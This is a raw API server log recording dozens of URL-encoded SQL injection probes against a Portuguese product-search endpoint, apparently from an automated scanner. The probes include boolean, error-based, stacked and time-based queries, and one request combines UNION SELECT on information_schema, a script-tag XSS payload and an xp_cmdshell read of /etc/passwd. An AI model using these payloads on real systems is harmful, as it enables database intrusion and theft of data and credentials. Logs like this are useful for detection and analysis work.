api-1  | INFO:     Started server process [1]
api-1  | INFO:     172.18.0.1:53850 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F9239%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289239%3D9239%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%287722%3D7722 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53864 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9239%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289239%3D9239%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53878 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9239%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289239%3D9239%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FbQYH HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53892 - "GET /produtos/busca/?categoria=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qbvzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289377%3D9377%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qqzxq%27%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53896 - "GET /produtos/busca/?categoria=teste%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53902 - "GET /produtos/busca/?categoria=teste%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53912 - "GET /produtos/busca/?categoria=teste%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53914 - "GET /produtos/busca/?categoria=teste%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53916 - "GET /produtos/busca/?categoria=teste%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53928 - "GET /produtos/busca/?categoria=teste%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53944 - "GET /produtos/busca/?categoria=teste%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53950 - "GET /produtos/busca/?categoria=teste%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53958 - "GET /produtos/busca/?categoria=teste%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%2871%29%7C%7CCHR%2868%29%7C%7CCHR%2867%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53962 - "GET /produtos/busca/?categoria=teste%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%2871%29%7C%7CCHR%2868%29%7C%7CCHR%2867%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53976 - "GET /produtos/busca/?categoria=teste%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%2871%29%7C%7CCHR%2868%29%7C%7CCHR%2867%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53988 - "GET /produtos/busca/?categoria=teste%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%2871%29%7C%7CCHR%2868%29%7C%7CCHR%2867%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:53998 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6205%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29bCQL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27jHgs%27%3D%27jHgs HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54004 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6205%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29bCQL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27WkRK%27%3D%27WkRK HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54012 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6205%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29bCQL%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288999%3D8999 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54028 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6205%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29bCQL%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54034 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F6205%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29bCQL%29--%2F%2A%2A%2FHHzT HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54038 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F6305%3D%28SELECT%2F%2A%2A%2F6305%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27OYVG%27%3D%27OYVG HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54050 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F6305%3D%28SELECT%2F%2A%2A%2F6305%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27YrYT%27%3D%27YrYT HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54014 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F6305%3D%28SELECT%2F%2A%2A%2F6305%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282781%3D2781 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54058 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6305%3D%28SELECT%2F%2A%2A%2F6305%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54072 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F6305%3D%28SELECT%2F%2A%2A%2F6305%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2FUvti HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54078 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27CftF%27%3D%27CftF HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54080 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27zRiS%27%3D%27zRiS HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54094 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%281056%3D1056 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54110 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54112 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FuGNz HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54140 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F8055%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2888%29%7C%7CCHR%28103%29%7C%7CCHR%28118%29%7C%7CCHR%28105%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27PeYX%27%3D%27PeYX HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54150 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F8055%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2888%29%7C%7CCHR%28103%29%7C%7CCHR%28118%29%7C%7CCHR%28105%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27liUe%27%3D%27liUe HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54128 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F8055%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2888%29%7C%7CCHR%28103%29%7C%7CCHR%28118%29%7C%7CCHR%28105%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288404%3D8404 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54164 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8055%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2888%29%7C%7CCHR%28103%29%7C%7CCHR%28118%29%7C%7CCHR%28105%29%2C5%29 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54178 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8055%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2888%29%7C%7CCHR%28103%29%7C%7CCHR%28118%29%7C%7CCHR%28105%29%2C5%29--%2F%2A%2A%2FHywy HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54162 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FGdnI HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54192 - "GET /produtos/busca/?categoria=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F9220--%2F%2A%2A%2FCjdD HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54202 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FzIZV HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54216 - "GET /produtos/busca/?categoria=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F9499--%2F%2A%2A%2FQmSJ HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54232 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FllZV HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54248 - "GET /produtos/busca/?categoria=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F6735--%2F%2A%2A%2FrAXQ HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54264 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FcxEp HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54272 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F8996--%2F%2A%2A%2FiMLV HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54252 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FTSlF HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54290 - "GET /produtos/busca/?categoria=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F5900--%2F%2A%2A%2FlhLn HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54306 - "GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54312 - "GET /produtos/busca/?nome=teste&categoria=eletronicos&hGmE=4093%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54320 - "GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54328 - "GET /produtos/busca/?nome=9887&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54330 - "GET /produtos/busca/?nome=teste%2C%28%22%2C%29%27..%29%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54336 - "GET /produtos/busca/?nome=teste%27toJYGy%3C%27%22%3EAQYBdw&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54338 - "GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54344 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F8683%3D2066%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27qGNN%27%3D%27qGNN&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54356 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F2333%3D3029%2F%2A%2A%2FAND%2F%2A%2A%2F%27VwEz%27%3D%27VwEz&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54364 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F4546%3D5938%2F%2A%2A%2FAND%2F%2A%2A%2F%287966%3D7966&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54368 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2950%3D8160&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54374 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F3779%3D9059--%2F%2A%2A%2FblIV&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54378 - "GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%284352%3D4144%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27teste%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F4144%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F2889%29%2F%2A%2A%2FEND%29%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54382 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281485%2CCONCAT%280x5c%2C0x716b767871%2C%28SELECT%2F%2A%2A%2F%28ELT%281485%3D1485%2C1%29%29%29%2C0x71627a6a71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27Pmnk%27%3D%27Pmnk&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54398 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281485%2CCONCAT%280x5c%2C0x716b767871%2C%28SELECT%2F%2A%2A%2F%28ELT%281485%3D1485%2C1%29%29%29%2C0x71627a6a71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27fShw%27%3D%27fShw&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54416 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281485%2CCONCAT%280x5c%2C0x716b767871%2C%28SELECT%2F%2A%2A%2F%28ELT%281485%3D1485%2C1%29%29%29%2C0x71627a6a71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%287487%3D7487&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54418 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281485%2CCONCAT%280x5c%2C0x716b767871%2C%28SELECT%2F%2A%2A%2F%28ELT%281485%3D1485%2C1%29%29%29%2C0x71627a6a71%29%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54432 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%281485%2CCONCAT%280x5c%2C0x716b767871%2C%28SELECT%2F%2A%2A%2F%28ELT%281485%3D1485%2C1%29%29%29%2C0x71627a6a71%29%29--%2F%2A%2A%2FNlna&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54406 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1545%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281545%3D1545%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27ugIr%27%3D%27ugIr&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54436 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F1545%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281545%3D1545%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27NFck%27%3D%27NFck&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54440 - "GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F1545%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281545%3D1545%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%288197%3D8197&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54442 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1545%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281545%3D1545%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54454 - "GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1545%3DCAST%28%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281545%3D1545%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FDgQF&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54464 - "GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1451%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281451%3D1451%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27WQqW%27%3D%27WQqW&categoria=eletronicos HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:54468 - "GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F1451%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%281451%3D1451%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27hwSu%27%3D%27hwSu&categoria=eletronicos HTTP/1.1" 200 OK
